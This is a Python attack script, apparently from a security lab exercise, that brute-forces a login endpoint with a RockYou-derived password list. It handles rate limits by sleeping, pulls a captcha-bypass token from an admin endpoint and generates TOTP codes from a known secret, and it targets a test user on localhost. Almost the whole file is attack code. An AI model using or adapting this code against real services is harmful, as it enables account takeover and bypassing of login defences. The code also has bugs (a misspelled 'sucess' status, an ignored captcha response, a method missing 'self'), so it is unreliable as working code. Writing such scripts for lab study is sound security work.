import requests
import time
import pyotp
import json

class Attacker:
    def __init__(self, base_url, dictionary_path, users_path, group_seed):
        self.base_url = base_url
        self.dictionary_path = dictionary_path
        self.users_path = users_path
        self.group_seed = group_seed
        self.password_list = self.get_password_list()
        self.session = requests.Session()
        
    def get_password_list(self):
        with open(self.dictionary_path, "r") as f:
            return [line.strip() for line in f.readlines()]
        
    def get_captcha_token(self):
        url = f"{self.base_url}/admin/get_captcha_token"
        try:
            resp = self.session.get(url, params={"group_seed": self.group_seed})
            if resp.status_code == 200:
                return resp.json().get("captcha_token")
        except Exception as e:
            print(f"Error: {e}")
        return None

    def login_attempt(self, username, password, captcha_token=None):
        url = f"{self.base_url}/login"
        payload = {
            "username": username,
            "password": password
        }
        if captcha_token:
            payload["captcha_token"] = captcha_token   
        return self.session.post(url, json=payload)

    def login_totp(self, username, totp_secret):
        url = f"{self.base_url}/login_totp"
        token = pyotp.TOTP(totp_secret).now()
        payload = {"username": username, "totp_token": token}
        return self.session.post(url, json=payload)
    
    def run_password_spray():
        pass

    def run_brute_force(self, target_username, target_totp_secret=None):
        for password in self.password_list:
            while True:
                resp = self.login_attempt(target_username, password)
                data = resp.json()
                status = data.get("status")

                match status:
                    case "sucess":
                        return True
                    case "totp_required":
                        totp_resp = self.login_totp(target_username, target_totp_secret)
                        if totp_resp.json().get("status") == "totp_success":
                            return True
                        break
                    case "rate_limit_reached":
                        # sleep for window
                        time.sleep(1) #todo change
                    case "captcha_required":
                        captcha_token = self.get_captcha_token()
                        self.login_attempt(target_username, password, captcha_token=captcha_token)
                        if resp.json().get("status") == "success": # toto validate status
                            return True
                        break
                    case "account_locked":
                        return False
                    case "failure":
                        break
        return False
    
    
    
    
if __name__ == "__main__":
    BASE_URL = "http://localhost"
    DICTIONARY_FILE_PATH = "../assets/rockyou_top_50k.txt"
    USERS_FILE_PATH = "../assets/users.json"
    GROUP_SEED = "214265977"
    
    attacker = Attacker(BASE_URL, DICTIONARY_FILE_PATH, USERS_FILE_PATH, GROUP_SEED)
    result = attacker.run_brute_force("user_weak_1")
    print(result)
    